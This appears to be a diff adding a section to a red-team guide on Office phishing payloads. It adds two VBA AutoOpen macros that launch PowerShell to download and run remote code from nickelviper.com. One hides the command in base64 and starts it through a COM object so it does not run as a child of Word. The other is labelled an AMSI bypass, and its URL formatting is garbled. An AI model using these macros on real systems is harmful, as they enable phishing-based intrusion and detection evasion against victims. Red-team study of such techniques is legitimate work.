@@ -74,6 +74,23 @@ End Sub
 
 You can change the text placeholders and URL to the payload on lines [160](https://github.com/ZeroPointSecurity/PhishingTemplates/blob/master/Office365/Word.html#L160), [183](https://github.com/ZeroPointSecurity/PhishingTemplates/blob/master/Office365/Word.html#L183), [192](https://github.com/ZeroPointSecurity/PhishingTemplates/blob/master/Office365/Word.html#L192), [197](https://github.com/ZeroPointSecurity/PhishingTemplates/blob/master/Office365/Word.html#L197), and [207](https://github.com/ZeroPointSecurity/PhishingTemplates/blob/master/Office365/Word.html#L207).  My payload URL will be _http://nickelviper.com/ProductReport.doc_.
 
+To prevent powershell from running as a childprocess of Word, use this example:
+``` vba
+Sub AutoOpen()
+
+	Set shellWindows = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
+	Set obj = shellWindows.Item()
+	obj.Document.Application.ShellExecute "powershell.exe", "-nop -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AbgBpAGMAawBlAGwAdgBpAHAAZQByAC4AYwBvAG0ALwBhACIAKQA=", Null, Null, 0
+
+End Sub
+```
+
+AMSI bypass:
+``` vba
+	Sub AutoOpen() Dim Shell As Object Set Shell = CreateObject("wscript.shell") 'AMSI bypass and payload Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('[http://nickelviper.com/a1'));IEX](http://nickelviper.com/a1'));IEX "http://nickelviper.com/a1'));IEX") ((new-object net.webclient).downloadstring('[http://nickelviper.com/a2')](http://nickelviper.com/a2') "http://nickelviper.com/a2')"))"""  
+End Sub
+```
+
 ## Remote Template Injection
 
 ---
